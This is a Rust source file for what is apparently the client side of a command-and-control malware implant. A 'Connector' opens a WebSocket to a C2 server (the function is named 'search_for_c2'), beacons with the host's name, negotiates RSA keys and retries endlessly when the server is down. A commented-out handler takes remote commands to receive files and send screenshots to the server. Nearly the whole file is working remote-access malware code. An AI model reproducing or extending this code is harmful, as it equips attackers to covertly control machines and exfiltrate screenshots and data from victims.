mod file_reciever;
mod screenshot_sender;

use std::{thread, time::Duration};

use futures_util::{
    stream::{SplitSink, SplitStream},
    SinkExt, StreamExt,
};
use gethostname::gethostname;
use rsa::{
    pkcs1::{EncodeRsaPrivateKey, EncodeRsaPublicKey},
    pkcs8::DecodePublicKey,
    Pkcs1v15Encrypt, RsaPrivateKey, RsaPublicKey,
};
use screenshots::image::EncodableLayout;
use tokio_tungstenite::{
    connect_async,
    tungstenite::{handshake::client::Response, Message},
    WebSocketStream,
};
pub struct Connector {
    //Server address sends data to main server
    address_server: String,
    write: Option<
        SplitSink<
            WebSocketStream<tokio_tungstenite::MaybeTlsStream<tokio::net::TcpStream>>,
            Message,
        >,
    >,
    read: Option<
        SplitStream<WebSocketStream<tokio_tungstenite::MaybeTlsStream<tokio::net::TcpStream>>>,
    >,
    public_key: Option<RsaPublicKey>,
    private_key: RsaPrivateKey,
}
impl Connector {
    pub fn new(address_server: String) -> Self {
        Connector {
            address_server,
            write: None,
            read: None,
            public_key: None,
            private_key: generate_private_key(),
        }
    }
    pub async fn send_data(&mut self, data: String, response: Response) {
        match &self
            .write
            .as_mut()
            .unwrap()
            .send(Message::Text(data.into()))
            .await
        {
            Ok(_) => println!("Message sent successfully"),
            Err(e) => {
                println!("Connected to the server");
                println!("Response HTTP code: {}", response.status());
                println!("Response contains the following headers:");
                for (header, _value) in response.headers() {
                    println!("* {header}");
                }
                eprintln!("Failed to send message: {}", e)
            }
        }
    }

    pub async fn search_for_c2(&mut self) {
        match connect_async(&self.address_server).await {
            Ok((ws_stream, response)) => {
                let (write, read) = ws_stream.split();
                self.write = Some(write);
                self.read = Some(read);
                println!("Connected to the server");
                self.send_data(
                    format!("ping|{}", gethostname().into_string().unwrap()),
                    response,
                )
                .await;
                if let Some(message) = self.read.as_mut().unwrap().next().await {
                    //Debug
                    //println!("{}", message.unwrap());
                    self.init_server(&message.unwrap().to_string()).await;
                }
                //when recieved a pong subscribe for updates
            }
            //make it keep trying
            Err(e) => {
                eprintln!("Failed to connect: {} the server is probably down", e);
                //wait for 6 min to try to connect again
                tokio::time::sleep(Duration::from_secs(6)).await;
                Box::pin(self.search_for_c2()).await;
            }
        }
    }
    pub async fn init_server(&mut self, message_str: &str) {
        if message_str == "pong" {
            let public_key_string = self
                .private_key
                .to_public_key()
                .to_pkcs1_pem(rsa::pkcs8::LineEnding::LF)
                .unwrap();

            self.write
                .as_mut()
                .unwrap()
                .send(Message::from(public_key_string))
                .await
                .unwrap();

            let mut server_public_key: Vec<u8> = Vec::new();
            for _ in 0..2 {
                if let Some(message) = self.read.as_mut().unwrap().next().await {
                    server_public_key.extend(
                        self.private_key
                            .decrypt(
                                Pkcs1v15Encrypt,
                                hex::decode(message.unwrap().to_string())
                                    .unwrap()
                                    .as_bytes(),
                            )
                            .unwrap(),
                    );
                }
            }
            self.public_key = Some(
                RsaPublicKey::from_public_key_pem(&String::from_utf8_lossy(
                    server_public_key.as_slice(),
                ))
                .unwrap(),
            );
            println!(
                "{}",
                self.public_key
                    .clone()
                    .unwrap()
                    .to_pkcs1_pem(rsa::pkcs8::LineEnding::LF)
                    .unwrap()
            );
            //Generate rsa keys and send them
        }
    }
    /*
    pub fn subscribe_for_updates(&self) {
        let server = TcpListener::bind(SERVER).unwrap();
        for stream in server.incoming() {
            let socket_addr_server = self.socket_addr_server.to_string();
            spawn(move || {
                use tokio_tungstenite::accept_async

                let mut websocket = accept(stream.unwrap()).unwrap();
                let mut writing = false;
                let mut buffer: Vec<u8> = Vec::new();
                loop {
                    let msg = websocket.read().unwrap();
                    if writing {
                        //file_reciever::recieve_file(msg.clone(), &mut buffer);
                    }
                    match msg.to_string().as_str() {
                        "file_transfer_start" => writing = true,
                        "picture_request" => {
                            screenshot_sender::make_screenshot(&socket_addr_server)
                        }
                        _ => println!("{}", msg),
                    }
                }
            });
        }
    }
    */
}
pub fn generate_private_key() -> RsaPrivateKey {
    let mut rng = rand::thread_rng();
    let bits = 2048;
    RsaPrivateKey::new(&mut rng, bits).expect("failed to generate a key")
}
